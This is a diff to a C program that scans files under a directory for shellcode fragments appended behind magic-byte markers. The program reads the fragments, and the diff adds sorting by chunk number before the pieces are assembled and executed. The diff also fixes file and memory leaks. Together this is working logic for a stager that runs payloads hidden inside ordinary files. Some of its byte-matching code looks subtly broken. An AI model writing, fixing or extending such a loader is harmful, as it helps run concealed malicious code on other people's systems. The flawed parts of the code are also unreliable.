@@ -39,8 +39,10 @@ FILE *detect_shellcode(char *path) {
   file_size = size_of_file(file);
   offset = (file_size < BLKSIZE) ? file_size : BLKSIZE;
   while (fseek(file, -offset, SEEK_END) != -1) {
-    if (fread(buf, sizeof(char), BLKSIZE, file) < 1)
+    if (fread(buf, sizeof(char), BLKSIZE, file) < 1) {
+      fclose(file);
       return (NULL);
+    }
     magic_byte = (int *)strchr(buf, 0xF33L);
     if (*magic_byte == 0xF33L && *(magic_byte + 1) == 0x600D) {
       fseek(file, -(offset + (buf - (char *)magic_byte)),  SEEK_END);
@@ -71,10 +73,42 @@ t_list *find_shellcode_chunks(char *root_path) {
         chunk_list = new_list(read_shellcode(fp));
       else
         list_add_front(&chunk_list, read_shellcode(fp));
+      fclose(fp);
     }
     list_ptr = list_ptr->next;
   }
+  free_file_list(&files);
   return (chunk_list);
+}
+
+int chunks_sorted(t_list *chunks) {
+  t_list *last = NULL;
+
+  while (chunks) {
+    if (last)
+      if (((t_shellcode *)last->data)->chunk_number > ((t_shellcode *)chunks->data)->chunk_number)
+        return (false);
+    last = chunks;
+    chunks = chunks->next;
+  }
+  return (true);
+}
+
+void sort_chunks(t_list *chunks) {
+  t_list *list_ptr;
+  t_shellcode *temp_ptr;
+
+  list_ptr = chunks;
+  while (!chunks_sorted(chunks)) {
+    if (!list_ptr->next)
+      list_ptr = chunks;
+    if (((t_shellcode *)list_ptr->data)->chunk_number > ((t_shellcode *)list_ptr->next->data)->chunk_number) {
+      temp_ptr = list_ptr->data;
+      list_ptr->data = list_ptr->next->data;
+      list_ptr->next->data = temp_ptr;
+    }
+    list_ptr = list_ptr->next;
+  }
 }
 
 t_shellcode *assemble_shellcode_chunks(t_list **chunks) {
@@ -122,11 +156,13 @@ int main(int argc, char *argv[]) {
   if (argc != 2)
     return (1);
   shellcode_chunks = find_shellcode_chunks(argv[1]);
+  if (!shellcode_chunks)
+    return (1);
+  sort_chunks(shellcode_chunks);
   shellcode = assemble_shellcode_chunks(&shellcode_chunks);
   if (!shellcode)
     return (1);
   execute_shellcode(shellcode);
-  /* DEBUG_print_shellcode(shellcode); */
   free(shellcode->buf);
   free(shellcode);
   return (0);
